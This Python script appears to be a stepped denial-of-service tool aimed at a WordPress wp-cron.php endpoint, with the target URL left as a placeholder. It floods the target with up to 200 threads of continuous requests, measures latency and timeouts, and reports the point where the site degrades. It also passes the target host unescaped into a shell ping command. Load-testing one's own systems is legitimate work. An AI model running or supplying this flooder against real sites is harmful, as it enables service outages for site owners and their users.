import requests
import threading
import time
import matplotlib.pyplot as plt
import numpy as np
from datetime import datetime
import socket
import platform
import os
from matplotlib.gridspec import GridSpec
import json

# Config parameters
URL = "https://website.com/wp-cron.php" # CHANGEME 
PHASES = [0, 20, 50, 100, 150, 200]  # First phase (0) is baseline measurement
PHASE_DURATION = 20  # seconds per phase
TIMEOUT = 30  # request timeout in seconds
OUTPUT_DIR = "flooding_test_results"

# Globals
latencies = []
timestamps = []
status_codes = []
phase_markers = []
current_phase = 0
stop_phase = False
lock = threading.Lock()

def get_baseline_metrics():
    """Measures baseline network conditions before the test"""
    print("[*] Measuring baseline network conditions...")
    host = URL.split("//")[1].split("/")[0]
    ping_result = os.popen(f"ping -c 4 {host}").read()
    baseline = {
        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "hostname": socket.gethostname(),
        "platform": platform.platform(),
        "target": URL,
        "ping_result": ping_result.strip(),
        "phases": PHASES,
        "phase_duration": PHASE_DURATION
    }
    os.makedirs(OUTPUT_DIR, exist_ok=True)
    with open(f"{OUTPUT_DIR}/baseline.json", "w") as f:
        json.dump(baseline, f, indent=2)
    return baseline

def make_request():
    """Makes a single request and records metrics"""
    global latencies, timestamps, status_codes
    start_time = time.time()
    try:
        r = requests.get(URL, timeout=TIMEOUT)
        latency = r.elapsed.total_seconds()
        status = r.status_code
    except requests.exceptions.Timeout:
        latency = TIMEOUT
        status = "Timeout"
    except Exception as e:
        latency = time.time() - start_time
        status = f"Error: {str(e)[:20]}"
    with lock:
        latencies.append(latency)
        timestamps.append(time.time())
        status_codes.append(status)

def flood_worker():
    """Thread worker that makes requests continuously"""
    global stop_phase
    while not stop_phase:
        make_request()

def run_test_phase(num_threads):
    """Runs a single test phase with the specified number of threads"""
    global stop_phase, current_phase, phase_markers
    stop_phase = False
    threads = []
    phase_start = time.time()
    with lock:
        phase_markers.append((len(latencies), num_threads, phase_start))
    print(f"[+] Phase {current_phase}: {num_threads} threads")
    for _ in range(num_threads):
        t = threading.Thread(target=flood_worker)
        t.daemon = True
        t.start()
        threads.append(t)
    time.sleep(PHASE_DURATION)
    stop_phase = True
    time.sleep(1)
    print(f"[-] Phase {current_phase} ended - {num_threads} threads")
    current_phase += 1

def classify_latencies():
    """Classifies latencies by range"""
    ranges = {
        "≤1s (normal)": 0,
        "1–3s (mild)": 0,
        "3–5s (moderate)": 0,
        "5–10s (critical)": 0,
        ">10s (severe)": 0
    }
    for l in latencies:
        if l <= 1:
            ranges["≤1s (normal)"] += 1
        elif l <= 3:
            ranges["1–3s (mild)"] += 1
        elif l <= 5:
            ranges["3–5s (moderate)"] += 1
        elif l <= 10:
            ranges["5–10s (critical)"] += 1
        else:
            ranges[">10s (severe)"] += 1
    return ranges

def stats_per_phase():
    """Calculates statistics for each test phase"""
    stats = []
    for i in range(len(phase_markers)):
        start_idx = phase_markers[i][0]
        end_idx = phase_markers[i+1][0] if i < len(phase_markers)-1 else len(latencies)
        phase_lat = latencies[start_idx:end_idx]
        phase_status = status_codes[start_idx:end_idx]
        if not phase_lat:
            continue
        timeouts = phase_status.count("Timeout")
        errors = sum(1 for s in phase_status if isinstance(s, str) and s.startswith("Error"))
        successes = sum(1 for s in phase_status if isinstance(s, int) and 200 <= s < 300)
        lat_array = np.array([l for l in phase_lat if l < TIMEOUT])
        if len(lat_array) > 0:
            mean = np.mean(lat_array)
            median = np.median(lat_array)
            p95 = np.percentile(lat_array, 95) if len(lat_array) >= 20 else None
        else:
            mean = median = p95 = None
        stats.append({
            "phase": i,
            "threads": phase_markers[i][1],
            "requests": len(phase_lat),
            "timeouts": timeouts,
            "timeouts_pct": (timeouts / len(phase_lat)) * 100 if phase_lat else 0,
            "errors": errors,
            "successes": successes,
            "mean_latency": mean,
            "median_latency": median,
            "percentile_95": p95
        })
    return stats

def generate_report():
    """Generates report and graphs"""
    os.makedirs(OUTPUT_DIR, exist_ok=True)
    timestamp = datetime.now().strftime("%Y%m%d-%H%M%S")
    raw_data = {
        "latencies": latencies,
        "timestamps": [t - timestamps[0] for t in timestamps],
        "status_codes": [str(s) for s in status_codes],
        "phases": [(m[0], m[1], m[2] - timestamps[0]) for m in phase_markers]
    }
    with open(f"{OUTPUT_DIR}/raw_data_{timestamp}.json", "w") as f:
        json.dump(raw_data, f)
    stats = stats_per_phase()
    with open(f"{OUTPUT_DIR}/stats_{timestamp}.json", "w") as f:
        json.dump(stats, f, indent=2)
    ranges = classify_latencies()
    plt.figure(figsize=(15, 15))
    gs = GridSpec(3, 2)
    # Pie chart
    ax1 = plt.subplot(gs[0, 0])
    labels = list(ranges.keys())
    sizes = list(ranges.values())
    colors = ['#8BC34A', '#FFEB3B', '#FFC107', '#FF5722', '#B71C1C']
    ax1.pie(sizes, labels=labels, colors=colors, autopct='%1.1f%%', startangle=140)
    ax1.set_title("Latency Distribution")
    # Timeline
    ax2 = plt.subplot(gs[0, 1])
    rel_times = [t - timestamps[0] for t in timestamps]
    ax2.plot(rel_times, latencies, 'b-', alpha=0.5)
    ax2.set_ylim(0, min(max(latencies) * 1.1, TIMEOUT * 1.1))
    for m in phase_markers:
        ax2.axvline(x=m[2] - timestamps[0], color='r', linestyle='--', alpha=0.7)
        ax2.text(m[2] - timestamps[0], max(latencies) * 0.9, f"{m[1]} threads", rotation=90)
    ax2.set_title("Latency Over Time")
    ax2.set_xlabel("Time (s)")
    ax2.set_ylabel("Latency (s)")
    # Mean latency per phase
    ax3 = plt.subplot(gs[1, 0])
    phase_nums = [e["phase"] for e in stats]
    means = [e["mean_latency"] if e["mean_latency"] is not None else 0 for e in stats]
    threads = [e["threads"] for e in stats]
    ax3.bar(phase_nums, means, color='orange')
    ax3.set_title("Mean Latency per Phase")
    ax3.set_xlabel("Phase")
    ax3.set_ylabel("Mean Latency (s)")
    for i, v in enumerate(means):
        if v > 0:
            ax3.text(i, v + 0.1, f"{threads[i]} thr", ha='center')
    # Timeouts per phase
    ax4 = plt.subplot(gs[1, 1])
    timeouts_pct = [e["timeouts_pct"] for e in stats]
    ax4.bar(phase_nums, timeouts_pct, color='red')
    ax4.set_title("Timeouts per Phase (%)")
    ax4.set_xlabel("Phase")
    ax4.set_ylabel("Timeouts (%)")
    ax4.set_ylim(0, 100)
    # Success rate per phase
    ax5 = plt.subplot(gs[2, 0])
    success_pct = [e["successes"] / e["requests"] * 100 if e["requests"] > 0 else 0 for e in stats]
    ax5.plot(phase_nums, success_pct, 'go-', linewidth=2)
    ax5.set_title("Success Rate per Phase")
    ax5.set_xlabel("Phase")
    ax5.set_ylabel("Success (%)")
    ax5.set_ylim(0, 100)
    # Throughput per load
    ax6 = plt.subplot(gs[2, 1])
    requests = [e["requests"] for e in stats]
    ax6.plot(threads, requests, 'bo-', linewidth=2)
    ax6.set_title("Requests Processed per Load")
    ax6.set_xlabel("Threads")
    ax6.set_ylabel("Requests")
    plt.tight_layout()
    plt.savefig(f"{OUTPUT_DIR}/full_report_{timestamp}.png", dpi=300)
    plt.figure(figsize=(8, 8))
    plt.pie(sizes, labels=labels, colors=colors, autopct='%1.1f%%', startangle=140)
    plt.title("Latency Distribution")
    plt.axis('equal')
    plt.tight_layout()
    plt.savefig(f"{OUTPUT_DIR}/pie_chart_{timestamp}.png")
    # Summary
    print("\n=== TEST SUMMARY ===")
    print(f"Tested URL: {URL}")
    print(f"Total requests: {len(latencies)}")
    print(f"Total duration: {rel_times[-1]:.1f} seconds")
    print("\nLatencies by range:")
    for r, q in ranges.items():
        print(f"  {r}: {q} ({q/len(latencies)*100:.1f}%)")
    print("\nResults per phase:")
    for e in stats:
        print(f"  Phase {e['phase']} ({e['threads']} threads): {e['requests']} req, " +
              f"{e['timeouts_pct']:.1f}% timeouts, " +
              f"mean latency: {e['mean_latency']:.3f}s")
    for i in range(1, len(stats)):
        if stats[i]["timeouts_pct"] > 50 or (stats[i]["mean_latency"] is not None and 
           stats[i-1]["mean_latency"] is not None and 
           stats[i]["mean_latency"] > stats[i-1]["mean_latency"] * 3):
            print(f"\n[!] Degradation point: Phase {stats[i]['phase']} with {stats[i]['threads']} threads")
            break
    print(f"\nFull report saved in: {OUTPUT_DIR}/")
    return stats

def main():
    global current_phase
    print("[*] Starting stepped DoS test")
    print(f"[*] Target URL: {URL}")
    print(f"[*] Phases: {PHASES} threads")
    print(f"[*] Phase duration: {PHASE_DURATION} seconds\n")
    os.makedirs(OUTPUT_DIR, exist_ok=True)
    get_baseline_metrics()
    for num_threads in PHASES:
        run_test_phase(num_threads)
    generate_report()
    print("\n[*] Test finished!")

if __name__ == "__main__":
    main()

